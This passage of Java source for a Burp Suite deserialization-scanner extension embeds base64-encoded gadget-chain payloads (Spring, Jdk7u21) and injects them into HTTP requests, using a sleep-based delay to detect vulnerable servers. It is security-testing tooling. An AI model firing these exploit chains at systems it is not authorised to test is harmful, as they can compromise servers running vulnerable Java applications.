dXRpbC9HYWRnZXRzAQADRm9vACEAAQADAAEABQABABoABwAIAAEACQAAAAIACgABAAEADAANAAEADgAAAC8AAQABAAAABSq3AA+xAAAAAgARAAAABgABAAAALwASAAAADAABAAAABQATABQAAAACABUAAAACABYAFwAAAAoAAQABABgAGgAJcHQABFB3bnJwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHB3BAAAAANzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXEAfgApeA=="));
        payloads.put("Spring", Base64.decodeBase64("rO0ABXNyAElvcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuU2VyaWFsaXphYmxlVHlwZVdyYXBwZXIkTWV0aG9kSW52b2tlVHlwZVByb3ZpZGVyskq0B4tBGtcCAANJAAVpbmRleEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwcm92aWRlcnQAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL2NvcmUvU2VyaWFsaXphYmxlVHlwZVdyYXBwZXIkVHlwZVByb3ZpZGVyO3hwAAAAAHQADm5ld1RyYW5zZm9ybWVyc30AAAABAD1vcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuU2VyaWFsaXphYmxlVHlwZVdyYXBwZXIkVHlwZVByb3ZpZGVyeHIAF2phdmEubGFuZy5yZWZsZWN0LlByb3h54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3IAMnN1bi5yZWZsZWN0LmFubm90YXRpb24uQW5ub3RhdGlvbkludm9jYXRpb25IYW5kbGVyVcr1DxXLfqUCAAJMAAxtZW1iZXJWYWx1ZXN0AA9MamF2YS91dGlsL01hcDtMAAR0eXBldAARTGphdmEvbGFuZy9DbGFzczt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAHZ2V0VHlwZXN9AAAAAgAWamF2YS5sYW5nLnJlZmxlY3QuVHlwZQAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXN4cQB+AAZzcgBgb3JnLnNwcmluZ2ZyYW1ld29yay5iZWFucy5mYWN0b3J5LnN1cHBvcnQuQXV0b3dpcmVVdGlscyRPYmplY3RGYWN0b3J5RGVsZWdhdGluZ0ludm9jYXRpb25IYW5kbGVyhWLLwAz9MRMCAAFMAA1vYmplY3RGYWN0b3J5dAAxTG9yZy9zcHJpbmdmcmFtZXdvcmsvYmVhbnMvZmFjdG9yeS9PYmplY3RGYWN0b3J5O3hwc30AAAABAC9vcmcuc3ByaW5nZnJhbWV3b3JrLmJlYW5zLmZhY3RvcnkuT2JqZWN0RmFjdG9yeXhxAH4ABnNxAH4ACXNxAH4ADT9AAAAAAAAMdwgAAAAQAAAAAXQACWdldE9iamVjdHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4AAUwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGPMr+ur4AAAAyADMHADEBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAGAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADABAMAAwADQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHABkBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAnAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAg8Y2xpbml0PgEAEGphdmEvbGFuZy9UaHJlYWQHACoBAAVzbGVlcAEABChKKVYMACwALQoAKwAuAQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjI2NzQzNDE4NzQ1MzUyMwEAIEx5c29zZXJpYWwvUHduZXIyNjc0MzQxODc0NTM1MjM7ACEAAQADAAEABQABABoABwAIAAEACQAAAAIACgAEAAEADAANAAEADgAAAC8AAQABAAAABSq3AA+xAAAAAgARAAAABgABAAAAJQASAAAADAABAAAABQATADIAAAABABUAFgACABcAAAAEAAEAGAAOAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAACgAEgAAACAAAwAAAAEAEwAyAAAAAAABABoAGwABAAAAAQAcAB0AAgABABUAHgACABcAAAAEAAEAGAAOAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAACsAEgAAACoABAAAAAEAEwAyAAAAAAABABoAGwABAAAAAQAfACAAAgAAAAEAIQAiAAMACAApAA0AAQAOAAAAIgADAAIAAAANpwADAUwRJxCFuAAvsQAAAAEAMAAAAAMAAQMAAgAjAAAAAgAkACUAAAAKAAEAAQAmACgACXVxAH4AIQAAAdTK/rq+AAAAMgAbBwACAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28HAAQBABBqYXZhL2xhbmcvT2JqZWN0BwAGAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADABAMAAwADQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAGQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAANGb28AIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAEAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAvABIAAAAMAAEAAAAFABMAFAAAAAIAFQAAAAIAFgAXAAAACgABAAEAGAAaAAlwdAAEUHducnB3AQB4eHZyABJqYXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhweHEAfgAm"));
        payloads.put("Java 6 and Java 7 (<= Jdk7u21)", Base64.decodeBase64("rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAED9AAAAAAAACc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGPMr+ur4AAAAyADMHADEBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAGAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADABAMAAwADQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHABkBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAnAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAg8Y2xpbml0PgEAEGphdmEvbGFuZy9UaHJlYWQHACoBAAVzbGVlcAEABChKKVYMACwALQoAKwAuAQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjI2NzQ2NzM0MDgzNjI1MQEAIEx5c29zZXJpYWwvUHduZXIyNjc0NjczNDA4MzYyNTE7ACEAAQADAAEABQABABoABwAIAAEACQAAAAIACgAEAAEADAANAAEADgAAAC8AAQABAAAABSq3AA+xAAAAAgARAAAABgABAAAAJQASAAAADAABAAAABQATADIAAAABABUAFgACABcAAAAEAAEAGAAOAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAACgAEgAAACAAAwAAAAEAEwAyAAAAAAABABoAGwABAAAAAQAcAB0AAgABABUAHgACABcAAAAEAAEAGAAOAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAACsAEgAAACoABAAAAAEAEwAyAAAAAAABABoAGwABAAAAAQAfACAAAgAAAAEAIQAiAAMACAApAA0AAQAOAAAAIgADAAIAAAANpwADAUwRJxCFuAAvsQAAAAEAMAAAAAMAAQMAAgAjAAAAAgAkACUAAAAKAAEAAQAmACgACXVxAH4ACwAAAdTK/rq+AAAAMgAbBwACAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28HAAQBABBqYXZhL2xhbmcvT2JqZWN0BwAGAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADABAMAAwADQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAGQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAANGb28AIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAEAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAvABIAAAAMAAEAAAAFABMAFAAAAAIAFQAAAAIAFgAXAAAACgABAAEAGAAaAAlwdAAEUHducnB3AQB4c30AAAABAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlc3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAXQACGY1YTVhNjA4cQB+AAh4dnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHg="));
        
        // Initialize the descriptions of the vulnerabilities
        activeScanIssue = "Java Unsafe Deserialization, vulnerable library: ";
        activeScanSeverity = "High";
        activeScanConfidence = "Firm";
        activeScanIssueDetail = "The application deserialize untrusted serialized Java objects,"+
        						" without first checking the type of the received object. This issue can be"+
        						" exploited by sending malicious objects that, when deserialized,"+
        						" execute custom Java code. Several objects defined in popular libraries"+
        						" can be used for the exploitation. The present issue has been exploited"+
        						" thanks to the disclosed vulnerability on library ";
        activeScanRemediationDetail = "The best way to mitigate the present issue is to"+
        							  " deserialize only known objects, by using custom "+
        							  " objects for the deserialization, insted of the Java "+
        							  " ObjectInputStream default one. The custom object must override the "+
        							  " resolveClass method, by inserting checks on the object type"+
        							  " before deserializing the received object. Furthermore, update the"+
        							  " library used for the exploitation to the lastest release.";
        
        passiveScanIssue = "Serialized Java objects detected";
        passiveScanSeverity = "Information";
        passiveScanConfidence = "Firm";
        passiveScanIssueDetail = "Serialized Java objects have been detected in the body"+
        						 " or in the parameters of the request. If the server application does "+
        						 " not check on the type of the received objects before"+
        						 " the deserialization phase, it may be vulnerable to the Java Deserialization"+
        						 " Vulnerability.";
        passiveScanRemediationDetail = "The best way to mitigate the present issue is to"+
				  					   " deserialize only known objects, by using custom "+
				  					   " objects for the deserialization, insted of the Java "+
				  					   " ObjectInputStream default one. The custom object must override the "+
				  					   " resolveClass method, by inserting checks on the object type"+
				  					   " before deserializing the received object.";  
        
        stdout.println("Java Deserialization Scanner v0.1");
        stdout.println("Created by: Federico Dotta");
        stdout.println("");
        stdout.println("Github: https://github.com/federicodotta/Java-Deserialization-Scanner");
        stdout.println("");
        
    }
    
    
    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
    	    	
    	List<IScanIssue> issues = new ArrayList<IScanIssue>();
    	
    	// Body
    	// Full body insertion point
    	byte[] request = baseRequestResponse.getRequest();
    	//IRequestInfo requestInfo = helpers.analyzeRequest(request);
    	int magicPos = helpers.indexOf(request, serializeMagic, false, 0, request.length);
    	int magicPosBase64 = helpers.indexOf(request, base64Magic, false, 0, request.length);
    	
    	if(magicPos > -1 || magicPosBase64 > -1) {
    		
    		// Adding of marker for the vulnerability report
			List<int[]> requestMarkers = new ArrayList<int[]>();
			if(magicPos > -1) {
				requestMarkers.add(new int[]{magicPos,request.length});
			} else {
				requestMarkers.add(new int[]{magicPosBase64,request.length});
			}
			
            issues.add(new CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    helpers.analyzeRequest(baseRequestResponse).getUrl(), 
                    new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestMarkers, new ArrayList<int[]>()) }, 
                    (magicPosBase64 > -1) ? (passiveScanIssue + " (encoded in Base64)") : (passiveScanIssue),
                    passiveScanSeverity,
                    passiveScanConfidence,
                    passiveScanIssueDetail,
                    passiveScanRemediationDetail));

            
    	}
    	
        if(issues.size() > 0) {
        	//stdout.println("Reporting " + issues.size() + " passive results");
        	return issues;
        } else {
        	return null;
        }    	

    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
 	
    	List<IScanIssue> issues = new ArrayList<IScanIssue>();
    	
    	// Full body insertion point
    	byte[] request = baseRequestResponse.getRequest();
    	IRequestInfo requestInfo = helpers.analyzeRequest(request);
    	int bodyOffset = requestInfo.getBodyOffset();
    	int magicPos = helpers.indexOf(request, serializeMagic, false, 0, request.length);
    	int magicPosBase64 = helpers.indexOf(request, base64Magic, false, 0, request.length);
    	
    	if(magicPos > -1 || magicPosBase64 > -1) {
    		
    		List<String> headers = requestInfo.getHeaders();
    		
    		Set<String> payloadKeys = payloads.keySet();
    		Iterator<String> iter = payloadKeys.iterator();
    		String currentKey;
    		while (iter.hasNext()) {
    			
    			currentKey = iter.next();
        		
        		byte[] newBody = null; 
        		if(magicPos > -1)	 {	
        			// Put directly the payload
        			newBody = ArrayUtils.addAll(Arrays.copyOfRange(request, bodyOffset, magicPos),payloads.get(currentKey));
        		} else {
        			// Encode the payload in Base64
        			newBody = ArrayUtils.addAll(Arrays.copyOfRange(request, bodyOffset, magicPosBase64),Base64.encodeBase64URLSafe(payloads.get(currentKey)));
        		}
        		byte[] newRequest = helpers.buildHttpMessage(headers, newBody);
        		
        		long startTime = System.nanoTime();
        		IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
        		long endTime = System.nanoTime();
        		long duration = (long)((((float)(endTime - startTime))) / 1000000000L);  //divide by 1000000 to get milliseconds.
        		
        		if(((int)duration) >= 10){
        			
        			// Vulnerability founded
        			
        			List<int[]> requestMarkers = new ArrayList<int[]>();
        			
        	    	int markerStartPos = 0;
        	    	if(magicPos > -1) {
        	    		markerStartPos = helpers.indexOf(newRequest, serializeMagic, false, 0, newRequest.length);
        			} else {
        				markerStartPos = helpers.indexOf(newRequest, base64Magic, false, 0, newRequest.length);
        			}
        	    	requestMarkers.add(new int[]{markerStartPos,newRequest.length});
        	    	
                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(), 
                            new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse, requestMarkers, new ArrayList<int[]>()) }, 
                            (magicPosBase64 > -1) ? (activeScanIssue + currentKey + " (encoded in Base64)") : (activeScanIssue + currentKey),
                            activeScanSeverity,
                            activeScanConfidence,
                            activeScanIssueDetail + currentKey + ".",
                            activeScanRemediationDetail));

        		}
        		
    		}    		
    		
		}
    	    	
    	
    	// Current insertion point
    	byte[] insertionPointBaseValue = insertionPoint.getBaseValue().getBytes();
		magicPos = helpers.indexOf(insertionPointBaseValue, serializeMagic, false, 0, insertionPointBaseValue.length);
		magicPosBase64 = helpers.indexOf(insertionPointBaseValue, base64Magic, false, 0, insertionPointBaseValue.length);
		
		if(magicPos > -1 || magicPosBase64 > -1) {
    		
    		Set<String> payloadKeys = payloads.keySet();
    		Iterator<String> iter = payloadKeys.iterator();
    		String currentKey;
    		while (iter.hasNext()) {
    			currentKey = iter.next();
        		byte[] newPayload = null;
        		
        		if(magicPos > -1) {
        			newPayload = ArrayUtils.addAll(Arrays.copyOfRange(insertionPointBaseValue, 0, magicPos),payloads.get(currentKey));
        		} else {
        			newPayload = ArrayUtils.addAll(Arrays.copyOfRange(insertionPointBaseValue, 0, magicPosBase64),Base64.encodeBase64URLSafe(payloads.get(currentKey)));
        		}
        		
        		byte[] newRequest = insertionPoint.buildRequest(newPayload);
        		long startTime = System.nanoTime();
        		IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
        		long endTime = System.nanoTime();
        		
        		long duration = TimeUnit.SECONDS.convert((endTime - startTime), TimeUnit.NANOSECONDS);
        		        		
        		if(((int)duration) >= 10){

        			// Vulnerability founded
        			
        			// Adding of marker for the vulnerability report
        			List<int[]> requestMarkers = new ArrayList<int[]>();
        			int markerStart = 0;
        			int markerEnd = 0;
        			
        			if(magicPosBase64 > -1) {
        				markerStart = helpers.indexOf(newRequest, Base64.encodeBase64URLSafe(payloads.get(currentKey)), false, 0, newRequest.length);
        				markerEnd = markerStart + helpers.urlEncode(Base64.encodeBase64URLSafe(payloads.get(currentKey))).length;
        			} else {
        				markerStart =  helpers.indexOf(newRequest, helpers.urlEncode(payloads.get(currentKey)), false, 0, newRequest.length);
        				markerEnd = markerStart + helpers.urlEncode(payloads.get(currentKey)).length;
        			}       			
        			
        			requestMarkers.add(new int[]{markerStart,markerEnd});
            		
                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(), 
                            new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse, requestMarkers, new ArrayList<int[]>()) }, 
                            (magicPosBase64 > -1) ? (activeScanIssue + currentKey + " (encoded in Base64)") : (activeScanIssue + currentKey),
                            activeScanSeverity,
                            activeScanConfidence,
                            activeScanIssueDetail + currentKey + ".",
                            activeScanRemediationDetail));        		        			
        		}        		
    		}
    	}	
    	       
        if(issues.size() > 0) {
        	//stdout.println("Reporting " + issues.size() + " active results");
        	return issues;
        } else {
        	return null;
        }

    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
    	
        if (existingIssue.getIssueName().equals(newIssue.getIssueName())) {
        	
        	byte[] existingRequestResponse = existingIssue.getHttpMessages()[0].getRequest();
        	byte[] newRequestResponse = newIssue.getHttpMessages()[0].getRequest();
            
        	int existingMagicPos = helpers.indexOf(existingRequestResponse, serializeMagic, false, 0, existingRequestResponse.length);
        	int newMagicPos = helpers.indexOf(newRequestResponse, serializeMagic, false, 0, newRequestResponse.length);
        	
        	if((existingMagicPos > -1) && (newMagicPos > -1)) {
        		        		
            	if(existingMagicPos == newMagicPos) {
                	
    	        	//stdout.println("Consolidate duplicate issue");	        	
    	        	return -1;
    	        
            	} else {
            	
            		return 0;
            	
            	}        		
        		
        	} else {
        		
        		int existingMagicPosBase64 = helpers.indexOf(existingRequestResponse, base64Magic, false, 0, existingRequestResponse.length);
        		int newMagicPosBase64 = helpers.indexOf(newRequestResponse, base64Magic, false, 0, newRequestResponse.length);

        		if(existingMagicPosBase64 == newMagicPosBase64) {
                	
    	        	//stdout.println("Consolidate duplicate issue");	        	
    	        	return -1;
    	        
            	} else {
            	
            		return 0;
            	
            	}  
        		
        	}

        } else { 
        	
        	return 0;
        	
        }
        
    }

 	
}

